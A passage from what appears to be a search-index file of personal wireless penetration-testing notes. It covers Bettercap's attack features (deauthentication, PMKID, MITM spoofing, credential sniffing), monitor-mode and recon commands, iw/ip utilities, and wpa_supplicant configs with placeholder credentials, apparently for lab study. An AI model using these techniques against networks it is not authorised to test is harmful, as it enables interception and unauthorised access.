WiFi networks, Bluetooth Low Energy devices, wireless HID devices and IPv4/IPv6 networks.</p> <ul> <li>WiFi networks scanning, deauthentication attack, clientless PMKID association attack and automatic WPA/WPA2 client handshakes capture.</li> <li>Bluetooth Low Energy devices scanning, characteristics enumeration, reading and writing.</li> <li>2.4Ghz wireless devices scanning and MouseJacking attacks with over-the-air HID frames injection (with DuckyScript support).</li> <li>Passive and active IP network hosts probing and recon.</li> <li>ARP, DNS, DHCPv6 and NDP spoofers for MITM attacks on IPv4 and IPv6 based networks.</li> <li>Proxies at packet level, TCP level and HTTP/HTTPS application level fully scriptable with easy to implement javascript plugins.</li> <li>A powerful network sniffer for credentials harvesting which can also be used as a network protocol fuzzer.</li> <li>A very fast port scanner.</li> <li>A powerful REST API with support for asynchronous events notification on websocket to orchestrate your attacks easily.</li> <li>An easy to use web user interface.</li> <li>More!</li> </ul>"},{"location":"wireless/software/bettercap/#installation","title":"Installation","text":"<ul> <li>Install on Kali (usually already installed)</li> </ul> <pre><code>sudo apt-get install bettercap -y\n</code></pre>"},{"location":"wireless/software/bettercap/#commands","title":"Commands","text":"<ul> <li>Run setup first</li> <li>Make sure that the ADAPTER is not already monitoring</li> </ul> <p><pre><code># Set AP to monitor mode old school way ... airmon-ng does not work\nsudo ip link set wlan0 down\nsudo iw wlan0 set monitor control\nsudo ip link set wlan0 up\n\n# Put in interactive mode\nsudo bettercap -iface $ADAPTER -silent #-debug\n\n# Set channel\nwifi.recon.channel 3\n\n# Run Recon\nwifi.recon on\n\n# Show APs\nwifi.show\n\n# Clear screen\nclear\n\n# Exit\nexit\n</code></pre> * Do same but with ticker at command line</p> <pre><code>sudo bettercap -iface $ADAPTER -silent -eval \"set ticker.commands 'clear; wifi.show'; wifi.recon on; ticker on\"\n\nticker off\nwifi.show\n\nwifi.recon $BSSID\n</code></pre>"},{"location":"wireless/software/bettercap/#docker-installation-script","title":"Docker Installation Script","text":"<pre><code>#!/usr/bin/env bash\n\ninstallDocker() {\nprintf '%s\\n' \"deb https://download.docker.com/linux/debian bullseye stable\" | sudo tee /etc/apt/sources.list.d/docker-ce.list\n    curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor --yes -o /etc/apt/trusted.gpg.d/docker-ce-archive-keyring.gpg\n    sudo apt update\n    sudo apt install -y docker-ce docker-ce-cli containerd.io docker-compose-plugin\n    sudo groupadd docker\n    sudo usermod -aG docker $USER\nsudo docker run hello-world\n    sudo systemctl stop docker &gt;/dev/null 2&gt;&amp;1\nsudo systemctl stop containerd &gt;/dev/null 2&gt;&amp;1\nsudo systemctl enable docker\n    sudo systemctl enable containerd\n    sudo systemctl start docker\n}\n\ninstallDockerCompose() {\nsudo apt-get install -y curl\n    rm -f /tmp/docker-compose\n    url=$(curl -s https://api.github.com/repos/docker/compose/releases/latest | grep browser_download_url | grep docker-compose-linux-x86_64 | cut -d '\"' -f 4 | grep -v \"sha\")\ncurl -L $url -o /tmp/docker-compose\n    chmod +x /tmp/docker-compose\n    sudo mv /tmp/docker-compose /usr/local/bin/docker-compose\n    chmod +x /usr/local/bin/docker-compose\n    docker-compose version\n}\n\ninstallDocker\ninstallDockerCompose\n\n# Roobt?\n</code></pre>"},{"location":"wireless/software/bettercap/#references","title":"References","text":"<ul> <li>Bettercap</li> <li>Bettercap Wi-Fi Module</li> </ul>"},{"location":"wireless/software/if-ip-iw/","title":"IF/IP/IW Commands","text":"<p>This page contains a collection of networking commands. Try to avoid using <code>iwconfig</code> since it is considered deprecated.</p>"},{"location":"wireless/software/if-ip-iw/#ifipiw-commands_1","title":"IF/IP/IW Commands","text":"<pre><code># iwlist\nsudo iwlist wlan0 frequency\n\n# Info about wireless devices\nsudo iw list\n\n# Grab the SSIDs\nsudo iw dev wlan0 scan | grep SSID\n\n# Grab channel number\nsudo iw dev wlan0 scan | egrep \"DS Parameter set|SSID:\"\n\n# Put in monitor mode\nsudo iw dev wlan0 interface add wlan0mon type monitor\n\n# Set link to up\nsudo ip link set wlan0mon up\n\n# Get info\nsudo iw dev wlan0mon info\n\n# Capture some frames\nsudo tcpdump -i wlan0mon\n\n# Remove (DON'T)\nsudo iw dev wlan0mon interface del\n\n# Get regulatory stuff\nsudo iw reg get\n</code></pre> <pre><code># Find connect wireless adapters\nifconfig\nip a\n\n# Get information about a wireless adapter\niw dev\niw dev wlan0 info\niwconfig\niwconfig wlan0\n\n# View the channels and frequencies of the wireless adapter\niw phy phy0 channels\niwlist wlan0 channel\n\n# Detect wireless APs\nsudo iw dev wlan0 scan | grep SSID\niwlist wlan0 scan | grep SSID\n\n# Get list of the channels the access points are running\nsudo iw dev wlan0 scan | egrep \"DS\\ Parameter\\ set|SSID\"\niwlist wlan0 scanning | egrep \"ESSID|Channel\"\n\n# Set AP to monitor mode old school way ... airmon-ng does not work\nsudo ip link set wlan0 down\nsudo iw wlan0 set monitor control\nsudo ip link set wlan0 up\n\n# Connect to an open network by frequency\niw wlan0 connect wifu 2432\niwconfig wlan0 essid wifu freq 2432M\n\n# Connect to a protected network\niw wlan0 connect wifu keys 0:abcde d:1:0011223344\niwconfig wlan0 key s:abcde; iwconfig wlan0 essid wifu\n\n# Set link on\nsudo ip link set wlan0mon up\nifconfig wlan0 up\n\n# Set link off\nip link set wlan0 down\nifconfig wlan0 down\n\n# Put interface in monitor mode\nsudo iw dev wlan0 interface add wlan0mon type monitor\nsudo airmon-ng start wlan0\nsudo iwconfig wlan0 monitor\n\n# Verify interface is working by injecting traffic\nsudo tcpdump -i wlan0mon -s 65000\n\n# Change the channel of ADAPTER\nsudo iw dev wlan0mon set channel 3\nsudo iwconfig wlan0mon channel 3\n\n# Put wireless device back to managed mode\nsudo iw dev wlan0mon del\nsudo iw phy phy0 interface add wlan0 type managed\nsudo iwconfig wlan0 mode managed\n\n# Delete VAP interface\n# Warning: Sometimes things go wrong, require reboot\nsudo iw dev wlan0mon interface del\n\n# Assign an IP address to a wireless interface\nsudo ip link set wlan0 down\nsudo ip addr add 192.168.123.1/24 dev wlan0\nsudo ip link set wlan0 up\n</code></pre>"},{"location":"wireless/software/kismet/","title":"Kismet","text":""},{"location":"wireless/software/kismet/#commands","title":"Commands","text":""},{"location":"wireless/software/kismet/#references","title":"References","text":"<ul> <li>Kismet</li> </ul>"},{"location":"wireless/software/lynx/","title":"Lynx","text":"<pre><code>sudo apt-get install lynx -y\nlynx http://192.168.1.1/proof.txt </code></pre>"},{"location":"wireless/software/misc/","title":"Misc Software","text":"<pre><code># Show connected USB devices\nsudo lsusb -vv\n\n# Show Kernel modules info\nsudo modinfo ath9k_htc\n\n# Show loaded modules\nsudo lsmod\n\n# Remove modules\nsudo rmmod ath\nsudo rmmod ath9k_htc ath9k_common ath9k_hw ath\n</code></pre>"},{"location":"wireless/software/scp-ssh/","title":"SCP/SSH Commands","text":""},{"location":"wireless/software/scp-ssh/#scp","title":"SCP","text":"<pre><code># Local path to remote path ... remote path can be a directory too\nscp $LOCAL_PATH $USER@$IP:$REMOTE_PATH\n\n# Remote path to local path ... local path can be a directory too\nscp $USER@$IP:$REMOTE_PATH $LOCAL_PATH\n</code></pre>"},{"location":"wireless/software/scp-ssh/#ssh","title":"SSH","text":"<pre><code>ssh $USER@$IP\n</code></pre>"},{"location":"wireless/software/wpa-supplicant/","title":"WPA-Supplicant","text":""},{"location":"wireless/software/wpa-supplicant/#connect-to-ap","title":"Connect to AP","text":"<pre><code>sudo wpa_supplicant -i wlan0 -c wifi-client.conf\n\n# sometimes the driver that wpa_supplican uses is specified (different from the driver used for the wifi interface)\nsudo wpa_supplicant -Dnl80211 -i wlan0 -c wifi-client.conf\n\n# request an ip by dhcp, once we are connected to an AP\nsudo dhclient -v wlan0\n\n\n# OR MANUALLY\nsudo /sbin/ifconfig wlan0 up\nsudo /sbin/iwlist wlan0 scan\nsudo /sbin/iwconfig wlan0 essid \"NetworkName\"\nsudo /sbin/iwconfig wlan0 key network_key\nsudo /sbin/iwconfig wlan0 enc on\nsudo dhclient -v wlan0\n\n# OR\nsudo iwconfig wlan0 essid &lt;SSID&gt; key s:&lt;KEY&gt;\nsudo dhclient -v wlan0\n\n# Open\niwconfig wlan0 essid &lt;SSID&gt;\nifconfig wlan0 up\ndhclient -v wlan0\n\n# WEP\niwconfig wlan0 essid &lt;SSID&gt; key &lt;key&gt;\nifconfig wlan0 up\nsudo dhclient -v wlan0\n\n# WPA PSK\nwpa_passphrase &lt;SSID&gt; &lt;passphrase&gt; &gt;&gt; /etc/wpa_supplicant.conf\nwpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant.conf\nsudo dhclient -v wlan0\nping 8.8.8.8\n</code></pre>"},{"location":"wireless/software/wpa-supplicant/#open-network","title":"Open Network","text":"<pre><code>network={\n  ssid=\"&lt;ESSID&gt;\"\n  scan_ssid=1\n}\n\n# OR\n\nnetwork={\n  ssid=\"&lt;ESSID&gt;\"\n  scan_ssid=1\n  mode=0\n  auth_alg=OPEN\n  key_mgmt=NONE\n}\n</code></pre>"},{"location":"wireless/software/wpa-supplicant/#wep","title":"WEP","text":"<pre><code>network={\n  ssid=\"&lt;ESSID&gt;\"\n  key_mgmt=NONE\n  wep_key0=\"34567\"\n  wep_tx_keyidx=0\n}\n\nnetwork={\n  ssid=\"&lt;ESSID&gt;\"\n  key_mgmt=NONE\n  wep_key0=0304050607\n  wep_tx_keyidx=0\n}\n</code></pre>"},{"location":"wireless/software/wpa-supplicant/#wpa2-psk","title":"WPA/2-PSK","text":"<pre><code>network={\n  ssid=\"&lt;ESSID&gt;\"\n  scan_ssid=1\n  psk=\"&lt;passphrase&gt;\"\n  key_mgmt=WPA-PSK\n}\n\n# OR\n\nnetwork={\n  ssid=\"&lt;ESSID&gt;\"\n  mode=0\n  scan_ssid=1\n  auth_alg=OPEN\n  key_mgmt=WPA-PSK\n  proto=WPA\n  pairwise=TKIP\n  group=TKIP\n  psk=\"&lt;passphrase&gt;\"\n}\n</code></pre>"},{"location":"wireless/software/wpa-supplicant/#wpa2-only","title":"WPA2 Only","text":"<pre><code>network={\n  ssid=\"&lt;ESSID&gt;\"\n  key_mgmt=WPA_PSK\n  psk=\"&lt;passphrase&gt;\"\n  proto=RSN\n  pairwise=CCMP\n  group=CCMP\n}\n\n# less specific, can work better\nnetwork={\n  ssid=\"&lt;ESSID&gt;\"\n  key_mgmt=WPA_PSK\n  psk=\"&lt;passphrase&gt;\"\n  proto=RSN\n}\n\n# or maybe this is necessary, due to retrocompatibility with old devices\nnetwork={\n  ssid=\"&lt;ESSID&gt;\"\n  key_mgmt=WPA_PSK\n  psk=\"&lt;passphrase&gt;\"\n  proto=WPA\n  pairwise=CCMP\n  group=CCMP\n}\n\nnetwork={\n  ssid=\"&lt;ESSID&gt;\"\n  scan_ssid=1\n  mode=0\n  auth_alg=OPEN\n  key_mgmt=WPA_PSK\n  psk=\"&lt;passphrase&gt;\"\n  proto=RSN\n  pairwise=CCMP\n  group=CCMP\n}\n</code></pre>"},{"location":"wireless/software/wpa-supplicant/#wpa-enterprise","title":"WPA Enterprise","text":"<pre><code>network={\n  ssid=\"&lt;ESSID&gt;\"\n  scan_ssid=1\n  key_mgmt=WPA-EAP\n  eap=PEAP\n  identity=\"bob\"\n  password=\"hello\"\n  phase1=\"peaplabel=0\"\n  phase2=\"auth=MSCHAPV2\"\n}\n\n  network={\n  ssid=\"&lt;ESSID&gt;\"\n  scan_ssid=1\n  key_mgmt=WPA-EAP\n  eap=PEAP\n  identity=\"bob\"\n  password=\"hello\"\n  phase1=\"peaplabel=0\"\n  phase2=\"auth=GTC\"\n}\n\nnetwork={\n  ssid=\"&lt;ESSID&gt;\"\n  scan_ssid=1\n  key_mgmt=WPA-EAP\n  eap=TTLS\n  identity=\"bob\"\n  anonymous_identity=\"anon\"\n  password=\"hello\"\n  phase2=\"auth=PAP\"\n}\n\nnetwork={\n  ssid=\"&lt;ESSID&gt;\"\n  scan_ssid=1\n  key_mgmt=WPA-EAP\n  eap=TTLS\n  identity=\"bob\"\n  anonymous_identity=\"anon\"\n  password=\"hello\"\n  phase2=\"auth=CHAP\"\n}\n\nnetwork={\n  ssid=\"&lt;ESSID&gt;\"\n  scan_ssid=1\n  key_mgmt=WPA-EAP\n  eap=TTLS\n  identity=\"bob\"\n  anonymous_identity=\"anon\"\n  password=\"hello\"\n  phase2=\"auth=MSCHAPV2\"\n}\n</code></pre>"},{"location":"wireless/software/wpa-supplicant/#references","title":"References","text":"<ul> <li>dh0ck</li> </ul>"}]}